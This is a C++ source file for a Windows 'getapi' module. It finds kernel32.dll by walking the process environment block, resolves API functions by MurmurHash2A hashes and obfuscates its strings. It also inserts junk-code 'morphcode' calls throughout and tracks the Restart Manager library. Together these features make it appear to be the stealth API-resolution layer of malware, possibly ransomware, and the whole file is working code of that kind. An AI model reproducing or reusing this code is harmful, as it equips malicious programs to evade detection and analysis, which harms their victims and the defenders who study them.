#include "getapi.h"
#include "hash.h"
#include "../obfuscation/MetaString.h"
#include "../mrph.h"

#define HASHING_SEED 0xb801fcda
#define API_CACHE_SIZE (sizeof(LPVOID) * 1024)

#ifdef _WIN64
#  define ADDR DWORDLONG
#else
#define   ADDR DWORD
#endif

#define RVATOVA( base, offset ) ( (ADDR)base + (ADDR)offset )

#define API_CACHE_SIZE (sizeof(LPVOID) * 1024)

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE
{
	LIST_ENTRY e[3];
	HMODULE base;
	void* entry;
	UINT size;
	UNICODE_STRING dllPath;
	UNICODE_STRING dllname;
};

typedef HMODULE(WINAPI *fnLoadLibraryA)(
	_In_ LPCSTR lpLibFileName
	);

STATIC HMODULE g_hKernel32;
STATIC fnLoadLibraryA pLoadLibraryA;
STATIC LPVOID* g_ApiCache = NULL;
STATIC BOOL g_IsRstrtMgrLoaded = FALSE;

BOOL
getapi::IsRestartManagerLoaded()
{
	return g_IsRstrtMgrLoaded;
}

VOID
getapi::SetRestartManagerLoaded(BOOL value)
{
	g_IsRstrtMgrLoaded = value;
}

STATIC
INT
StrLen(__in LPCSTR Str)
{
	INT Length = 0;
	while (*Str)
	{

		Length++;
		Str++;

	}

	return Length;
}

STATIC
INT
StrLen(__in LPCWSTR Str)
{
	INT Length = 0;
	while (*Str)
	{

		Length++;
		Str++;

	}

	return Length;
}

STATIC
VOID 
m_memcpy(
	__out PVOID pDst, 
	__in CONST PVOID pSrc,
	__in size_t size
	)
{
	void* tmp = pDst;
	size_t wordsize = sizeof(size_t);
	unsigned char* _src = (unsigned char*)pSrc;
	unsigned char* _dst = (unsigned char*)pDst;
	size_t   len;
	for (len = size / wordsize; len--; _src += wordsize, _dst += wordsize)
		*(size_t*)_dst = *(size_t*)_src;

	len = size % wordsize;
	while (len--)
		*_dst++ = *_src++;
}

STATIC
LPSTR 
FindChar(
	__in LPSTR Str,
	__in CHAR Ch
	)
{
	while (*Str)
	{

		if (*Str == Ch) {
			return Str;
		}

		Str++;

	}

	return NULL;
}

STATIC
int 
my_stoi(__in char* str) 
{
	unsigned int strLen = 0;
	unsigned int i = 0;
	while (str[i] != '\0') {
		strLen += 1;
		i++;
	}

	int num = 0;
	int ten;
	BOOL signFlag = TRUE; //true: +, false: -
	for (i = 0; i < strLen; i++) {
		if (str[i] < '0' || str[i] > '9') {
			if (i == 0 && str[i] == '-') {
				signFlag = FALSE;
				continue;
			}
			if (i == 0 && str[i] == '+') {
				signFlag = TRUE;
				continue;
			}

			return 0;
		}

		ten = 1;
		for (unsigned int j = 0; j < strLen - 1 - i; j++) {
			ten *= 10;
		}

		num += ten * (str[i] - '0');
	}

	if (signFlag) {
		return num;
	}
	else {
		return -num;
	}
}

STATIC
LPVOID
GetForvardedProc(__in PCHAR Name)
{
	char szDll[] = { '.','c','k','m',0 };
	// Функция обработки переназначения экспорта
	// На входе должна быть строка DllName.ProcName или DllName.#ProcNomber
	--szDll[3];
	szDll[1]++;
	++szDll[2];

	morphcode(szDll);

	if (Name == NULL) return NULL;

	morphcode(Name);

	char DLLName[256];
	//m_memset(DLLName, 0, sizeof(DLLName));
	RtlSecureZeroMemory(DLLName, 256);

	morphcode(DLLName);

	PCHAR NameStr = FindChar(Name, '.');
	if (!NameStr) return NULL;

	morphcode(NameStr);


	/// Собираем имя библиотеки
	m_memcpy(DLLName, Name, NameStr - Name);

	strcat(DLLName, szDll);

	/// определяем имя функции
	++NameStr;
	if (*NameStr == '#')
	{
		morphcode(*NameStr);

		// Имя является номером функции
		++NameStr;

		morphcode(*NameStr);

		DWORD OrdNomber = my_stoi(NameStr);

		morphcode(OrdNomber);

		return getapi::GetProcAddressEx(DLLName, 0, OrdNomber); 

	}

	DWORD Hash = MurmurHash2A(NameStr, StrLen(NameStr), HASHING_SEED);

	morphcode(Hash);

	return getapi::GetProcAddressEx(DLLName, 0, Hash);
}

BOOL CheckForForvardedProc(ADDR Addr, PIMAGE_EXPORT_DIRECTORY Table, DWORD DataSize)
{
	if (Addr > (ADDR)Table) {

		morphcode(Addr);

		if ((Addr - (ADDR)Table < DataSize)) {

			morphcode(Table);

			return TRUE;

		}
	}
	return FALSE;
}


ADDR GetFunctionAddresss(HMODULE Module, PIMAGE_EXPORT_DIRECTORY Table, LONG Ordinal)
{
	PDWORD AddrTable = (PDWORD)RVATOVA(Module, Table->AddressOfFunctions);
	morphcode(AddrTable);
	DWORD RVA = AddrTable[Ordinal];
	morphcode(RVA);
	ADDR Ret = (ADDR)RVATOVA(Module, RVA);
	morphcode(Ret);
	return Ret;
}

VOID ReturnAddress(PDWORD pAddress, DWORD dwAddress)
{
	DWORD temp = dwAddress + 1;
	morphcode(temp);
	CopyMemory(&temp, &dwAddress, sizeof(DWORD));
	morphcode(temp);
	temp++;
	CopyMemory(pAddress, &temp, sizeof(DWORD));
	morphcode(pAddress);
}

STATIC
INT 
FindFunction(
	__in HMODULE Module,
	__in  DWORD Hash,
	__in PIMAGE_EXPORT_DIRECTORY Table
	)
{
	INT Ordinal = 0;
	morphcode(Ordinal);

	if (HIWORD(Hash) == 0)
	{
		// Ищем функцию по её номеру
		Ordinal = (LOWORD(Hash)) - Table->Base;
		morphcode(Ordinal);
	}
	else
	{

		// Ищем функцию по номеру
		PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table->AddressOfNames);

		morphcode(NamesTable);

		PWORD  OrdinalTable = (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

		morphcode(OrdinalTable);

		unsigned int i;
		char* ProcName;

		for (i = 0; i < Table->NumberOfNames; ++i)
		{

			ProcName = (char*)RVATOVA(Module, *NamesTable);
			morphcode(ProcName);
			DWORD ProcHash = MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED);

			if (ProcHash == Hash)
			{
				morphcode(Ordinal);

				Ordinal = *OrdinalTable;
				break;
			}

			// Увеличиваем позицию в таблице
			++NamesTable;
			++OrdinalTable;

		}

	}

	return Ordinal;
}

/*

STATIC
ADDR 
GetApiAddr(
	__in HMODULE Module,
	__in DWORD Hash, 
	__in ADDR* Address
	)
{
	
	PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER)((char*)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

	morphcode(poh);

	// Получаем адрес таблицы экспорта
	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	morphcode(Table);

	DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	morphcode(DataSize);

	INT Ordinal = FindFunction(Module, Hash, Table); // Номер необходимой нам функции

	morphcode(Ordinal);

	// не нашли номер
	if (!Ordinal) {
		return NULL;
	}

	ADDR Ret = GetFunctionAddresss(Module, Table, Ordinal);

	morphcode(Ret);

	if (CheckForForvardedProc(Ret, Table, DataSize)) {
		Ret = (ADDR)GetForvardedProc((PCHAR)Ret);
		morphcode(Ret);
	}

	return Ret;
	//ReturnAddress(Address, Ret + 1);
}

*/

ADDR GetApiAddr(HMODULE Module, DWORD ProcNameHash, ADDR* Address)
{
	/*----------- Функция возвращает адрес функции по её названию -----------*/
	// Получаем адрес дополнительных PE заголовков
	PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER)((char*)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

	// Получаем адрес таблицы экспорта
	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD DataSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	INT Ordinal; // Номер необходимой нам функции
	BOOL Found = FALSE;

	if (HIWORD(ProcNameHash) == 0)
	{
		// Ищем функцию по её номеру
		Ordinal = (LOWORD(ProcNameHash)) - Table->Base;
	}
	else
	{
		// Ищем функцию по номеру
		PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table->AddressOfNames);
		PWORD  OrdinalTable = (WORD*)RVATOVA(Module, Table->AddressOfNameOrdinals);

		unsigned int i;
		char* ProcName;

		for (i = 0; i < Table->NumberOfNames; ++i)
		{

			ProcName = (char*)RVATOVA(Module, *NamesTable);


			if (MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED) == ProcNameHash)
			{
				Ordinal = *OrdinalTable;
				Found = TRUE;
				break;
			}

			// Увеличиваем позицию в таблице
			++NamesTable;
			++OrdinalTable;

		}

	}


	// не нашли номер
	if (!Found) {

		*Address = 0;
		return 0;

	}

	ADDR Ret = GetFunctionAddresss(Module, Table, Ordinal);

	if (CheckForForvardedProc(Ret, Table, DataSize)) {
		Ret = (ADDR)GetForvardedProc((PCHAR)Ret);
	}

	//ReturnAddress(Address, Ret + 1);
	return Ret;
}

STATIC
DWORD
GetHashBase(__in LDR_MODULE* mdll)
{
	char name[64];

	size_t i = 0;

	while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1)
	{

		morphcode(mdll->dllname.Buffer[i]);

		name[i] = (char)mdll->dllname.Buffer[i];

		morphcode(name[i]);

		i++;
	}

	name[i] = 0;

	return MurmurHash2A(name, StrLen(name), HASHING_SEED);
}

STATIC
HMODULE
GetKernel32()
{
	HMODULE krnl32;
	PCWCHAR Kernel32Dll = OBFW(L"Kernel32.dll");

#ifdef _WIN64
	const auto ModuleList = 0x18;
	const auto ModuleListFlink = 0x18;
	const auto KernelBaseAddr = 0x10;
	const INT_PTR peb = __readgsqword(0x60);
#else
	int ModuleList = 0x0C;
	int ModuleListFlink = 0x10;
	int KernelBaseAddr = 0x10;
	INT_PTR peb = __readfsdword(0x30);
#endif

	// Теперь получим адрес kernel32.dll
	const auto mdllist = *(INT_PTR*)(peb + ModuleList);
	morphcode(mdllist);
	const auto mlink = *(INT_PTR*)(mdllist + ModuleListFlink);
	morphcode(mlink);
	auto krnbase = *(INT_PTR*)(mlink + KernelBaseAddr);
	morphcode(krnbase);

	auto mdl = (LDR_MODULE*)mlink;
	do
	{
		mdl = (LDR_MODULE*)mdl->e[0].Flink;
		morphcode(mdl);

		if (mdl->base != nullptr)
		{
			morphcode(mdl->base);

			if (GetHashBase(mdl) == KERNEL32DLL_HASH) { // KERNEL32.DLL

				break;

			}
		}
	} while (mlink != (INT_PTR)mdl);

	krnl32 = static_cast<HMODULE>(mdl->base);
	morphcode(krnl32);
	return krnl32;
}

BOOL 
getapi::InitializeGetapiModule()
{
	g_hKernel32 = GetKernel32();
	morphcode(g_hKernel32);

	ADDR dwLoadLibraryA;
	pLoadLibraryA = (fnLoadLibraryA)GetApiAddr(g_hKernel32, LOADLIBRARYA_HASH, &dwLoadLibraryA);

	morphcode(pLoadLibraryA);

	if (!pLoadLibraryA) {
		return FALSE;
	}

	g_ApiCache = (LPVOID*)malloc(API_CACHE_SIZE);

	morphcode(g_ApiCache);

	if (!g_ApiCache) {
		return FALSE;
	}

	RtlSecureZeroMemory(g_ApiCache, API_CACHE_SIZE);
	return TRUE;
}

LPVOID
getapi::GetProcAddressEx(
	__in LPCSTR ModuleName, 
	__in DWORD ModuleId,
	__in DWORD Hash
	)
{
	HMODULE hModule = NULL;
	ADDR ProcAddress = NULL;

	LPCSTR Advapi32DLL = OBFA("Advapi32.dll");
	LPCSTR Kernel32DLL = OBFA("Kernel32.dll");
	LPCSTR Netapi32DLL = OBFA("Netapi32.dll");
	LPCSTR IphlpapiDLL = OBFA("Iphlpapi.dll");
	LPCSTR RstrtmgrDLL = OBFA("Rstrtmgr.dll");
	LPCSTR Ws2_32DLL = OBFA("ws2_32.dll");
	LPCSTR User32DLL = OBFA("User32.dll");
	LPCSTR ShlwapiDLL = OBFA("Shlwapi.dll");
	LPCSTR Shell32DLL = OBFA("Shell32.dll");
	LPCSTR Ole32DLL = OBFA("Ole32.dll");
	LPCSTR OleAut32DLL = OBFA("OleAut32.dll");
	LPCSTR NtdllDLL = OBFA("ntdll.dll");

	if (ModuleName)
	{

		morphcode((char*)ModuleName);

		hModule = pLoadLibraryA(ModuleName);

		morphcode(hModule);

		if (hModule) {

			ProcAddress = GetApiAddr(hModule, Hash, &ProcAddress);

			morphcode(ProcAddress);

			return (LPVOID)ProcAddress;

		}

		return (LPVOID)0;

	}
	else
	{

		switch (ModuleId)
		{

		case KERNEL32_MODULE_ID:
			ModuleName = Kernel32DLL;
			break;

		case ADVAPI32_MODULE_ID:
			ModuleName = Advapi32DLL;
			break;

		case NETAPI32_MODULE_ID:
			ModuleName = Netapi32DLL;
			break;

		case IPHLPAPI_MODULE_ID:
			ModuleName = IphlpapiDLL;
			break;

		case RSTRTMGR_MODULE_ID:
			ModuleName = RstrtmgrDLL;
			break;

		case USER32_MODULE_ID:
			ModuleName = User32DLL;
			break;

		case WS2_32_MODULE_ID:
			ModuleName = Ws2_32DLL;
			break;

		case SHLWAPI_MODULE_ID:
			ModuleName = ShlwapiDLL;
			break;

		case SHELL32_MODULE_ID:
			ModuleName = Shell32DLL;
			break;

		case OLE32_MODULE_ID:
			ModuleName = Ole32DLL;
			break;

		case OLEAUT32_MODULE_ID:
			ModuleName = OleAut32DLL;
			break;

		case NTDLL_MODULE_ID:
			ModuleName = NtdllDLL;
			break;

		default:
			return (LPVOID)0;

		}

		hModule = pLoadLibraryA(ModuleName);

		morphcode(hModule);

		if (hModule) {

			ProcAddress = GetApiAddr(hModule, Hash, &ProcAddress);

			morphcode(ProcAddress);

			return (LPVOID)ProcAddress;

		}

	}

	return (LPVOID)0;
}

LPVOID 
getapi::GetProcAddressEx2(
	__in LPSTR Dll, 
	__in DWORD ModuleId, 
	__in DWORD Hash, 
	__in int CacheIndex
	)
{
	// Функция возвращает адрес функции используя кэш
	LPVOID Addr = NULL;

	Addr = g_ApiCache[CacheIndex];
	morphcode(Addr);

	if (!Addr) {

		// Функции нет в кэше. Получаем её адрес и добавляем в кэш
		Addr = GetProcAddressEx(Dll, ModuleId, Hash);

		morphcode(Addr);

		g_ApiCache[CacheIndex] = Addr;

	}
	return Addr;
}